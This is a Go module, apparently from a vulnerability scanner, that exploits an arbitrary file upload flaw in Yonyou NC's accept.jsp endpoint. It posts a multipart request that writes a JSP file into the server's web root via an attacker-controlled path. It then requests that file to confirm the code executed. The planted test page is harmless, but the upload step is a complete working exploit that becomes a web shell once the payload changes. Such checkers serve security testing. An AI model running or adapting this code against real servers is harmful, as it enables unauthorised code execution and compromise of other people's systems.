package accept_upload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	uploadURL := url + "/aim/equipmap/accept.jsp"
	jspURL := url + "/login123.jsp"
	data := "-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name=\"upload\"; filename=\"2XOSxplUo2EnwilSNJazJYZxZUc.txt\"\nContent-Type: text/plain\n\n<% out.println(\"123test\"); %>\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name=\"fname\"\n\n\\webapps\\nc_web\\login123.jsp\n-----------------------------16314487820932200903769468567--"

	// 执行 POST 请求
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":   UA,
		"Content-Type": "multipart/form-data; boundary=---------------------------16314487820932200903769468567",
	}).SetBody(data).Post(uploadURL)

	if err != nil || resp.StatusCode != 200 {
		color.Red.Println("[-] 用友 accept 任意文件上传漏洞不存在（POST 请求失败）")
		return
	}

	// 执行 GET 请求
	resp, err = client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(jspURL)

	if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.String(), "123test") {
		color.Red.Println("[-] 用友 accept 任意文件上传漏洞不存在（GET 请求验证失败）")
		return
	}

	color.Green.Println("[+] 用友 accept 任意文件上传漏洞存在 -> " + url)
}
